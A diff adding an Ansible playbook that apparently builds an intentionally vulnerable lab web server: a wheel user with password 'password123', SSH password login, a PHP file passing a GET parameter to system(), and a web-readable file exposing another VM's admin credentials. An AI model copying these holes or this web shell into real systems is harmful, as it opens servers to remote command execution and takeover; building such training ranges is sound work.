@@ -1,0 +1,79 @@
+---
+- name: Web Server with exposed files
+  hosts: all
+  remote_user: ansible
+  become: true
+  vars:
+    target_vm2_ip: "192.168.56.20"
+  
+  tasks:
+    - name: Install Apache (httpd) and PHP
+      dnf:
+        name:
+          - httpd
+          - php
+          - php-mysqlnd
+        state: present
+    
+    - name: Enable and start httpd service
+      systemd:
+        name: httpd
+        enabled: yes
+        state: started
+      
+    - name: Create weak SSH credentials
+      user:
+        name: webadmin
+        password: "{{ 'password123' | password_hash('sha512') }}"
+        groups: wheel
+        shell: /bin/bash
+        
+    - name: Configure SSH to allow password authentication
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#?PasswordAuthentication'
+        line: 'PasswordAuthentication yes'
+      notify: Restart SSH
+      
+    - name: Create /var/www/html/internal directory
+      file:
+        path: /var/www/html/internal
+        state: directory
+        mode: '0755'
+        setype: httpd_sys_content_t
+      
+    - name: Create vulnerable PHP file for command injection
+      copy:
+        content: |
+          <?php
+            if(isset($_GET['cmd'])) {
+              system($_GET['cmd']);
+            }
+          ?>
+        dest: /var/www/html/debug.php
+        mode: '0644'
+        setype: httpd_sys_content_t
+        
+    - name: Create internal network documentation file
+      copy:
+        content: |
+          Internal Network Documentation
+          --------------------------------
+          VM2 IP: {{ target_vm2_ip }}
+          VM2 Admin: sysadmin
+          VM2 Password: Adm1nP@ss!
+        dest: /var/www/html/internal/network.txt
+        mode: '0644'
+        setype: httpd_sys_content_t
+    
+    - name: Configure SELinux to allow httpd to execute system commands (needed for the vulnerable PHP)
+      shell: setsebool -P httpd_execmem 1
+    
+    - name: Configure SELinux to allow httpd to connect to the network
+      shell: setsebool -P httpd_can_network_connect 1
+  
+  handlers:
+    - name: Restart SSH
+      systemd:
+        name: sshd
+        state: restarted
